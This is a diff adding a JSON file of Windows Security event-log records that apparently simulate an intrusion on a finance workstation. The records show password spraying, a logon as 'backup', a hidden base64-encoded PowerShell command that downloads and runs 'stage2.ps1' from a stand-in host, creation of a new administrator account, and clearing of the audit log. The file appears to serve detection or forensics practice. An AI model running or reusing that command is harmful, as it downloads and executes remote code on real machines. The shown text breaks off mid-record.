@@ -1,0 +1,467 @@
+[
+  {
+    "Id": 4624,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48241,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T08:31:10.1988148+00:00",
+    "Message": "An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWS-FIN-07$\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t2\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\r\n\tAccount Name:\t\talice\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x876200\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWS-FIN-07\r\n\tSource Network Address:\t127.0.0.1\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 1102,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48240,
+    "TaskDisplayName": "Log clear",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:26:06.7816464+00:00",
+    "Message": "The audit log was cleared.\r\nSubject:\r\n\tSecurity ID:\tS-1-5-21-1004336348-1177238915-682003330-1107\r\n\tAccount Name:\tbackup\r\n\tDomain Name:\tCORP\r\n\tLogon ID:\t0x5A3F21"
+  },
+  {
+    "Id": 4732,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48239,
+    "TaskDisplayName": "Security Group Management",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:18:06.7795749+00:00",
+    "Message": "A member was added to a security-enabled local group.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1107\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x5A3F21\r\n\r\nMember:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1131\r\n\tAccount Name:\t\t-\r\n\r\nGroup:\r\n\tSecurity ID:\t\tS-1-5-32-544\r\n\tGroup Name:\t\tAdministrators\r\n\tGroup Domain:\t\tBuiltin"
+  },
+  {
+    "Id": 4720,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48238,
+    "TaskDisplayName": "User Account Management",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:17:46.4790625+00:00",
+    "Message": "A user account was created.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1107\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x5A3F21\r\n\r\nNew Account:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1131\r\n\tAccount Name:\t\thelpdesk2\r\n\tAccount Domain:\t\tCORP\r\n\r\nAttributes:\r\n\tSAM Account Name:\thelpdesk2\r\n\tDisplay Name:\t\t<value not set>\r\n\tUser Principal Name:\t-\r\n\tPassword Last Set:\t<never>"
+  },
+  {
+    "Id": 4688,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48237,
+    "TaskDisplayName": "Process Creation",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:14:46.8666030+00:00",
+    "Message": "A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1107\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x5A3F21\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1a2c\r\n\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tToken Elevation Type:\t%%1937\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x17b0\r\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\r\n\tProcess Command Line:\tpowershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMAAwAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA"
+  },
+  {
+    "Id": 4624,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48236,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:12:46.8214365+00:00",
+    "Message": "An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1105\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x47BAC2\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4672,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48235,
+    "TaskDisplayName": "Special Logon",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:12:46.4879761+00:00",
+    "Message": "Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1107\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x5A3F21\r\n\r\nPrivileges:\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48234,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:12:08.1669652+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48233,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:12:00.4509258+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\ttest\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48232,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:54.1017722+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48231,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:48.0209198+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadministrator\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48230,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:44.9525460+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48229,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:37.5107272+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadmin\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48228,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:29.4260410+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48227,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:24.2473382+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tscanner\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48226,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:21.3326756+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4740,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48225,
+    "TaskDisplayName": "User Account Management",
+    "KeywordsDisplayNames": [
+      "Audit Success"
+    ],
+    "TimeCreated": "2026-03-12T02:11:15.0784292+00:00",
+    "Message": "A user account was locked out.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-18\r\n\tAccount Name:\t\tWS-FIN-07$\r\n\tAccount Domain:\t\tCORP\r\n\tLogon ID:\t\t0x5A3F21\r\n\r\nAccount That Was Locked Out:\r\n\tSecurity ID:\t\tS-1-5-21-1004336348-1177238915-682003330-1120\r\n\tAccount Name:\t\tsvc_sql\r\n\r\nAdditional Information:\r\n\tCaller Computer Name:\tWIN-R4ND0M"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48224,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:14.4820415+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48223,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:06.8036456+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tguest\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48222,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:11:03.6418299+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tadministrator\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48221,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:57.7723224+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tsvc_sql\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48220,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:53.3442978+00:00",
+    "Message": "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tbackup\r\n\tAccount Domain:\t\tCORP\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tWIN-R4ND0M\r\n\tSource Network Address:\t203.0.113.99\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM"
+  },
+  {
+    "Id": 4625,
+    "Version": 0,
+    "LevelDisplayName": "Information",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "MachineName": "WS-FIN-07.corp.example.com",
+    "RecordId": 48219,
+    "TaskDisplayName": "Logon",
+    "KeywordsDisplayNames": [
+      "Audit Failure"
+    ],
+    "TimeCreated": "2026-03-12T02:10:49.4455327+00:00",
